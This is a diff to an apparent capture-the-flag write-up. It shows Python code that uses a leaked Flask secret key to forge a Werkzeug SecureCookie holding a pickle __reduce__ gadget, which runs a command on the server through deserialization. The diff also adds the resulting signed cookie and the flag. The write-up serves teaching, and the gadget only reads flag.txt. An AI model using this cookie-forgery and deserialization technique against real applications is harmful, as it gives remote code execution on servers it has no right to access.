@@ -206,15 +206,34 @@ The `path` variable will contain the part of our URL after `http://127.0.0.1:500
 With our newly created post, we have obtained the value of `SECRET_KEY` as `superdupersecretflagonkey`. We can now sign our own cookies and do on RCE to get our flag. To generate the cookie, we will use this code (note the `username` is the username of the admin that we are logged in as):
 
 ```python
+import os
 import subprocess
+
 from werkzeug.contrib.securecookie import SecureCookie
 
-class a(object):
+class RCE(object):
     def __reduce__(self):
-        return (subprocess.check_output, (['cat', 'flag.txt']))
+        return (subprocess.check_output, (['cat','flag.txt'],))
 
 SECRET_KEY = 'superdupersecretflagonkey'
 
-print(SecureCookie({'name':a(), 'username':'meow_cf665777'}, SECRET_KEY).serialize())
+payload = {'name': RCE() , 'username': 'meow_cf665777'}
+
+x = SecureCookie(payload, SECRET_KEY)
+
+value = x.serialize()
+print(value)
 ```
+
+We get the ouptut as:
+
 ```
+FbFYqFStc9FXQBRsRz/NJHQO01c=?name=Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAwCigobHAxClMnY2F0JwpwMgphUydmbGFnLnR4dCcKcDMKYXRwNApScDUKLg==&username=UydtZW93X2NmNjY1Nzc3JwpwMAou
+```
+
+Setting this as our new `session_data` cookie gets us the flag.
+![Imgur](https://i.imgur.com/3ibPmKI.png)
+
+Flag:
+`flag{werks_on_my_box}`
+
